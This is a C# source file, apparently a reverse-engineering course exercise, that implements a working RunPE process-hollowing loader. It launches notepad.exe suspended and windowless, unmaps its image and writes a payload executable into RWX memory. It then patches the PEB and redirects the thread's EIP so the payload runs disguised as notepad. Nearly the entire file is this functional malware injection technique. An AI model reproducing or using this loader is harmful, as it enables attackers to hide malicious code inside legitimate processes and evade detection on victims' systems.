using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace RunPE
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            string targetPath = @"C:\Windows\SysWOW64\notepad.exe";
            string payloadPath = @"C:\Users\misha.kurtz\Reverse-Engineering\A02-Process-Inj-Hollowing-Code-Inj\A02_5\bin\A02_5_loaded_exe.exe";

            Console.WriteLine($"[A02_5] Target path:    {targetPath}");
            Console.WriteLine($"[A02_5] Target exists:  {File.Exists(targetPath)}");
            Console.WriteLine($"[A02_5] Payload path:   {payloadPath}");
            Console.WriteLine($"[A02_5] Payload exists: {File.Exists(payloadPath)}");
            Console.WriteLine($"[A02_5] Host bitness:   {(IntPtr.Size == 8 ? "64-bit" : "32-bit")}");

            if (!File.Exists(payloadPath))
            {
                Console.WriteLine("[A02_5] ERROR: Payload not found.");
                return;
            }

            byte[] payload = File.ReadAllBytes(payloadPath);
            Console.WriteLine("[A02_5] Starting process hollowing...");
            RunPE.Execute(targetPath, payload);
            Console.WriteLine("[A02_5] Done.");
        }
    }

    public static class RunPE
    {
        // ── CONTEXT flags ────────────────────────────────────────────────────────
        private const uint CONTEXT_i386 = 0x00010000u;
        private const uint CONTEXT_CONTROL = CONTEXT_i386 | 0x0001u; // EBP, EIP, ESP, EFLAGS, SegCs, SegSs
        private const uint CONTEXT_INTEGER = CONTEXT_i386 | 0x0002u; // EAX–EDX, ESI, EDI
        private const uint CONTEXT_SEGMENTS = CONTEXT_i386 | 0x0004u; // DS, ES, FS, GS
        private const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

        // ── Structures ───────────────────────────────────────────────────────────

        /// <summary>
        /// x87 FPU save area embedded in CONTEXT_x86.
        /// Matches FLOATING_SAVE_AREA exactly (112 bytes).
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;   // +0x00
            public uint StatusWord;    // +0x04
            public uint TagWord;       // +0x08
            public uint ErrorOffset;   // +0x0C
            public uint ErrorSelector; // +0x10
            public uint DataOffset;    // +0x14
            public uint DataSelector;  // +0x18
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea; // +0x1C  (80 bytes)
            public uint Spare0;       // +0x6C
        } // total: 112 bytes

        /// <summary>
        /// Proper x86 (WOW64) CONTEXT struct — matches winnt.h layout exactly.
        ///
        /// Field offsets (all decimal and hex):
        ///   0x000  ContextFlags
        ///   0x004  Dr0 … Dr7   (debug regs, 6 × DWORD)
        ///   0x01C  FloatSave   (112 bytes = 0x70)
        ///   0x08C  SegGs … SegDs
        ///   0x09C  Edi, Esi, Ebx, Edx, Ecx, Eax
        ///   0x0B4  Ebp
        ///   0x0B8  Eip         ← entry-point goes here
        ///   0x0BC  SegCs
        ///   0x0C0  EFlags
        ///   0x0C4  Esp
        ///   0x0C8  SegSs
        ///   0x0CC  ExtendedRegisters[512]
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct CONTEXT_x86
        {
            // ── Control which groups are valid ───────────────────────────────────
            public uint ContextFlags;        // 0x000

            // ── Debug registers ──────────────────────────────────────────────────
            public uint Dr0;                 // 0x004
            public uint Dr1;                 // 0x008
            public uint Dr2;                 // 0x00C
            public uint Dr3;                 // 0x010
            public uint Dr6;                 // 0x014
            public uint Dr7;                 // 0x018

            // ── Floating-point state ─────────────────────────────────────────────
            public FLOATING_SAVE_AREA FloatSave; // 0x01C … 0x08B

            // ── Segment registers ────────────────────────────────────────────────
            public uint SegGs;               // 0x08C
            public uint SegFs;               // 0x090
            public uint SegEs;               // 0x094
            public uint SegDs;               // 0x098

            // ── General-purpose registers ────────────────────────────────────────
            public uint Edi;                 // 0x09C
            public uint Esi;                 // 0x0A0
            public uint Ebx;                 // 0x0A4  ← PEB pointer lives here
            public uint Edx;                 // 0x0A8
            public uint Ecx;                 // 0x0AC
            public uint Eax;                 // 0x0B0

            // ── Control registers ────────────────────────────────────────────────
            public uint Ebp;                 // 0x0B4
            public uint Eip;                 // 0x0B8  ← redirect execution here
            public uint SegCs;               // 0x0BC
            public uint EFlags;              // 0x0C0
            public uint Esp;                 // 0x0C4
            public uint SegSs;               // 0x0C8

            // ── Extended (SSE) registers ─────────────────────────────────────────
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters; // 0x0CC  (512 bytes)
        } // total: 716 bytes

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)]
            public byte[] Misc;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // ── P/Invoke declarations ─────────────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern bool CreateProcessA(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            ref PROCESS_INFORMATION lpProcessInformation);

        // For 32-bit host → use these directly
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT_x86 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT_x86 lpContext);

        // For 64-bit host targeting a 32-bit (WOW64) process → use these
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, ref CONTEXT_x86 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64SetThreadContext(IntPtr hThread, ref CONTEXT_x86 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            ref int lpBuffer, int nSize, ref int lpNumberOfBytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int ResumeThread(IntPtr hThread);

        // ── Helper: choose Get/SetThreadContext variant by host bitness ──────────

        private static bool GetCtx(IntPtr thread, ref CONTEXT_x86 ctx)
            => IntPtr.Size == 4
                ? GetThreadContext(thread, ref ctx)      // 32-bit host
                : Wow64GetThreadContext(thread, ref ctx); // 64-bit host → WOW64 target

        private static bool SetCtx(IntPtr thread, ref CONTEXT_x86 ctx)
            => IntPtr.Size == 4
                ? SetThreadContext(thread, ref ctx)
                : Wow64SetThreadContext(thread, ref ctx);

        // ── Main hollowing logic ──────────────────────────────────────────────────

        public static void Execute(string path, byte[] payload)
        {
            for (int attempt = 0; attempt < 5; attempt++)
            {
                int rw = 0;
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

                try
                {
                    // ── 1. Spawn target suspended ─────────────────────────────────
                    const uint CREATE_SUSPENDED = 0x00000004;
                    const uint CREATE_NO_WINDOW = 0x08000000;

                    if (!CreateProcessA(path, string.Empty,
                            IntPtr.Zero, IntPtr.Zero, false,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW,
                            IntPtr.Zero, null, ref si, ref pi))
                        throw new Exception($"CreateProcessA failed. GLE={Marshal.GetLastWin32Error()}");

                    // ── 2. Parse PE headers from payload ──────────────────────────
                    int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, e_lfanew + 0x34);
                    int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, e_lfanew + 0x54);
                    int entryPointRVA = BitConverter.ToInt32(payload, e_lfanew + 0x28);
                    short numSections = BitConverter.ToInt16(payload, e_lfanew + 0x06);

                    Console.WriteLine($"[A02_5] PE ImageBase=0x{imageBase:X8}  EP_RVA=0x{entryPointRVA:X8}  Sections={numSections}");

                    // ── 3. Get thread context (proper struct) ─────────────────────
                    CONTEXT_x86 ctx = new CONTEXT_x86 { ContextFlags = CONTEXT_FULL };

                    if (!GetCtx(pi.ThreadHandle, ref ctx))
                        throw new Exception($"GetThreadContext failed. GLE={Marshal.GetLastWin32Error()}");

                    Console.WriteLine($"[A02_5] EBX (PEB ptr) = 0x{ctx.Ebx:X8}");

                    // ── 4. Read image base from PEB+8 ─────────────────────────────
                    int pebImageBase = 0;
                    IntPtr pebImageBaseAddr = new IntPtr((long)ctx.Ebx + 8);

                    if (!ReadProcessMemory(pi.ProcessHandle, pebImageBaseAddr,
                            ref pebImageBase, 4, ref rw))
                        throw new Exception($"ReadProcessMemory (PEB) failed. GLE={Marshal.GetLastWin32Error()}");

                    Console.WriteLine($"[A02_5] PEB ImageBase = 0x{pebImageBase:X8}");

                    // ── 5. Unmap if base addresses collide ────────────────────────
                    if (imageBase == pebImageBase)
                    {
                        uint unmapResult = ZwUnmapViewOfSection(
                            pi.ProcessHandle, new IntPtr(pebImageBase));

                        if (unmapResult != 0)
                            throw new Exception($"ZwUnmapViewOfSection failed. NTSTATUS=0x{unmapResult:X8}");
                    }

                    // ── 6. Allocate memory in target ──────────────────────────────
                    const uint MEM_COMMIT_RESERVE = 0x3000;
                    const uint PAGE_EXECUTE_READWRITE = 0x40;

                    IntPtr newBase = VirtualAllocEx(
                        pi.ProcessHandle,
                        new IntPtr(imageBase),
                        (uint)sizeOfImage,
                        MEM_COMMIT_RESERVE,
                        PAGE_EXECUTE_READWRITE);

                    if (newBase == IntPtr.Zero)
                        throw new Exception($"VirtualAllocEx failed. GLE={Marshal.GetLastWin32Error()}");

                    Console.WriteLine($"[A02_5] Allocated at 0x{newBase.ToInt64():X8}");

                    // ── 7. Write PE headers ───────────────────────────────────────
                    if (!WriteProcessMemory(pi.ProcessHandle, newBase, payload, sizeOfHeaders, ref rw))
                        throw new Exception($"WriteProcessMemory (headers) failed. GLE={Marshal.GetLastWin32Error()}");

                    // ── 8. Write each section ─────────────────────────────────────
                    int sectionTableOffset = e_lfanew + 0xF8; // after full Optional Header

                    for (int s = 0; s < numSections; s++)
                    {
                        int va = BitConverter.ToInt32(payload, sectionTableOffset + 0x0C);
                        int rawSize = BitConverter.ToInt32(payload, sectionTableOffset + 0x10);
                        int rawOffset = BitConverter.ToInt32(payload, sectionTableOffset + 0x14);

                        if (rawSize > 0)
                        {
                            byte[] section = new byte[rawSize];
                            Buffer.BlockCopy(payload, rawOffset, section, 0, rawSize);

                            IntPtr dest = new IntPtr(newBase.ToInt32() + va);
                            if (!WriteProcessMemory(pi.ProcessHandle, dest, section, section.Length, ref rw))
                                throw new Exception(
                                    $"WriteProcessMemory (section {s}) failed. GLE={Marshal.GetLastWin32Error()} " +
                                    $"VA=0x{va:X} size=0x{rawSize:X}");
                        }

                        sectionTableOffset += 0x28; // sizeof(IMAGE_SECTION_HEADER)
                    }

                    // ── 9. Patch PEB ImageBaseAddress ──────────────────────────────
                    byte[] newBaseBytes = BitConverter.GetBytes(newBase.ToInt32());
                    if (!WriteProcessMemory(pi.ProcessHandle, pebImageBaseAddr, newBaseBytes, 4, ref rw))
                        throw new Exception($"WriteProcessMemory (PEB update) failed. GLE={Marshal.GetLastWin32Error()}");

                    // ── 10. Redirect EIP → payload entry point ────────────────────
                    ctx.Eip = (uint)(newBase.ToInt32() + entryPointRVA);
                    Console.WriteLine($"[A02_5] Redirecting EIP → 0x{ctx.Eip:X8}");

                    if (!SetCtx(pi.ThreadHandle, ref ctx))
                        throw new Exception($"SetThreadContext failed. GLE={Marshal.GetLastWin32Error()}");

                    // ── 11. Resume ────────────────────────────────────────────────
                    if (ResumeThread(pi.ThreadHandle) == -1)
                        throw new Exception($"ResumeThread failed. GLE={Marshal.GetLastWin32Error()}");

                    Console.WriteLine("[A02_5] Process hollowing succeeded.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[A02_5] Attempt {attempt + 1} failed: {ex.Message}");

                    if (pi.ProcessId != 0)
                    {
                        try { Process.GetProcessById((int)pi.ProcessId).Kill(); }
                        catch { /* already dead */ }
                    }

                    continue;
                }

                break; // success
            }
        }
    }
}